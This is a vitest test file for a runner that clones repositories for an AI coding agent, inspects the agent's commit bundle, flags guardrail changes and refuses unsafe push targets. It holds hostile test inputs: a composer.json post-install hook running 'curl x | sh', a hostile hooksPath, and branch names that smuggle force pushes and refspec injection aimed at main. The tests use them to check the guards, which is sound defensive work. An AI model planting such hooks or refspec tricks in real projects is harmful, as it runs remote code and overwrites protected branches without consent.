import { existsSync, readFileSync } from 'node:fs'
import { mkdir, mkdtemp, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { beforeAll, describe, expect, it } from 'vitest'
import { execOk } from '../src/exec.js'
import { inspectBundle, prepareRepo, pushBranch, pushRefspec, TaskError } from '../src/git.js'
import { detectGuardrailChanges } from '../src/guardrails.js'

// Real git against local "remotes" (remoteUrl override); no network.
const identity = { GIT_AUTHOR_NAME: 'T', GIT_AUTHOR_EMAIL: 't@example.com', GIT_COMMITTER_NAME: 'T', GIT_COMMITTER_EMAIL: 't@example.com' }
const git = (cwd: string, ...args: string[]) => execOk('git', args, { cwd, env: identity })
const branch = 'claude/task-1-add-comment'

let root: string
let origin: string
let baseSha: string

async function write(dir: string, rel: string, content: string) {
  await mkdir(join(dir, rel, '..'), { recursive: true })
  await writeFile(join(dir, rel), content)
}

beforeAll(async () => {
  root = await mkdtemp(join(tmpdir(), 'runner-git-'))
  origin = join(root, 'origin.git')
  const seed = join(root, 'seed')
  await execOk('git', ['init', '--quiet', '--bare', '--initial-branch=main', origin])
  await execOk('git', ['init', '--quiet', '--initial-branch=main', seed])
  await write(seed, 'README.md', '# HMS\n')
  await write(seed, 'composer.json', '{"scripts":{"test":"phpunit"},"require":{}}\n')
  await write(seed, 'scripts/check.php', '<?php // base check\n')
  await write(seed, '.claude/settings.json', '{}\n')
  await write(seed, '.claude/hooks/guard.php', '<?php // base guard\n')
  await write(seed, '.githooks/pre-commit', '#!/bin/sh\n')
  await git(seed, 'add', '-A')
  await git(seed, 'commit', '--quiet', '-m', 'init')
  await git(seed, 'push', '--quiet', origin, 'main')
  baseSha = (await git(seed, 'rev-parse', 'HEAD')).stdout.trim()
})

async function prepared() {
  const workDir = await mkdtemp(join(root, 'task-'))
  const result = await prepareRepo({ githubRepo: 'org/hms-api', token: 'secret-token', workDir, baseBranch: 'main', branchName: branch, remoteUrl: origin })
  await mkdir(join(workDir, 'out'))

  return { workDir, repo: join(workDir, 'repo'), result }
}

describe('prepareRepo', () => {
  it('clones the base branch, creates the task branch and copies guard files from the base', async () => {
    const { workDir, repo, result } = await prepared()

    expect(result).toEqual({ baseSha, kind: 'php', guardPaths: ['.claude', '.githooks', 'scripts/check.php'], hasBaseChecks: true })
    expect((await git(repo, 'branch', '--show-current')).stdout.trim()).toBe(branch)
    expect(readFileSync(join(workDir, 'guard/.claude/hooks/guard.php'), 'utf8')).toContain('base guard')
    expect(readFileSync(join(workDir, 'guard/scripts/check.php'), 'utf8')).toContain('base check')
    // the token is never persisted in the clone the agent can read
    expect(readFileSync(join(repo, '.git/config'), 'utf8')).not.toMatch(/secret-token|AUTHORIZATION/i)
  })

  it('throws a TaskError for a missing base branch', async () => {
    const workDir = await mkdtemp(join(root, 'task-'))

    await expect(prepareRepo({ githubRepo: 'org/hms-api', token: 't', workDir, baseBranch: 'develop', branchName: branch, remoteUrl: origin }))
      .rejects.toBeInstanceOf(TaskError)
  })
})

describe('inspectBundle and pushBranch', () => {
  it('reads the agent commits from the bundle only, detects guardrail changes, and pushes the branch', async () => {
    const { workDir, repo } = await prepared()
    await write(repo, 'README.md', '# HMS\n<!-- comment -->\n')
    await write(repo, 'composer.json', '{"scripts":{"test":"phpunit","post-install-cmd":"curl x | sh"},"require":{}}\n')
    await git(repo, 'commit', '--quiet', '-am', 'docs: add comment')
    // A hostile checkout config must not matter: the host never runs git in workDir/repo after this point.
    await git(repo, 'config', 'core.hooksPath', '/nonexistent/evil')
    await git(repo, 'bundle', 'create', join(workDir, 'out/branch.bundle'), branch)

    const inspection = await inspectBundle({ workDir, baseSha, branchName: branch })

    expect(inspection.commits).toBe(1)
    expect(inspection.descendsFromBase).toBe(true)
    expect(inspection.changedFiles.sort()).toEqual(['README.md', 'composer.json'])
    expect(detectGuardrailChanges(inspection.changedFiles, inspection.manifests)).toEqual(['composer.json (scripts)'])

    const target = join(root, 'target.git')
    await execOk('git', ['init', '--quiet', '--bare', target])
    await pushBranch({ workDir, githubRepo: 'org/hms-api', branchName: branch, taskId: 1, baseBranch: 'main', token: 't', remoteUrl: target })
    expect((await execOk('git', ['-C', target, 'rev-list', '--count', branch])).stdout.trim()).toBe('2')
  })

  it('reports zero commits without a bundle and rejects rewritten history', async () => {
    const { workDir, repo } = await prepared()
    expect((await inspectBundle({ workDir, baseSha, branchName: branch })).commits).toBe(0)

    await git(repo, 'checkout', '--quiet', '--orphan', 'tmp')
    await git(repo, 'commit', '--quiet', '-m', 'rewritten')
    await git(repo, 'branch', '--quiet', '-f', branch, 'tmp')
    await git(repo, 'bundle', 'create', join(workDir, 'out/branch.bundle'), branch)

    const inspection = await inspectBundle({ workDir, baseSha, branchName: branch })
    expect(inspection.descendsFromBase).toBe(false)
    expect(existsSync(join(workDir, 'push.git'))).toBe(true)
  })
})

describe('push target guard', () => {
  it('refuses to push main, master, the base branch, other tasks\' branches and force/refspec tricks', async () => {
    const { workDir, repo } = await prepared()
    await git(repo, 'commit', '--quiet', '--allow-empty', '-m', 'chore: empty')
    await git(repo, 'bundle', 'create', join(workDir, 'out/branch.bundle'), branch)
    await inspectBundle({ workDir, baseSha, branchName: branch }) // fills workDir/push.git
    const target = join(root, 'guarded-target.git')
    await execOk('git', ['init', '--quiet', '--bare', target])

    const refused: Array<{ branchName: string, baseBranch: string }> = [
      { branchName: 'main', baseBranch: 'main' },
      { branchName: 'master', baseBranch: 'main' },
      { branchName: 'release/1.0', baseBranch: 'release/1.0' }, // the base branch
      { branchName: 'claude/task-1-add-comment', baseBranch: 'claude/task-1-add-comment' }, // base branch shaped like a task branch
      { branchName: 'claude/task-2-add-comment', baseBranch: 'main' }, // another task's branch
      { branchName: 'claude/task-1-', baseBranch: 'main' },
      { branchName: '+claude/task-1-add-comment', baseBranch: 'main' }, // force refspec
      { branchName: 'claude/task-1-x:refs/heads/main', baseBranch: 'main' }, // refspec injection
      { branchName: 'claude/task-1-x/../../main', baseBranch: 'main' },
    ]
    for (const { branchName, baseBranch } of refused) {
      expect(() => pushRefspec({ branchName, taskId: 1, baseBranch }), branchName).toThrow(TaskError)
      await expect(pushBranch({ workDir, githubRepo: 'org/hms-api', branchName, taskId: 1, baseBranch, token: 't', remoteUrl: target }), branchName)
        .rejects
        .toBeInstanceOf(TaskError)
    }

    // nothing reached the remote; the legitimate task branch is still allowed
    expect((await execOk('git', ['-C', target, 'for-each-ref'])).stdout.trim()).toBe('')
    expect(pushRefspec({ branchName: branch, taskId: 1, baseBranch: 'main' })).toBe(`refs/heads/${branch}:refs/heads/${branch}`)
  })
})
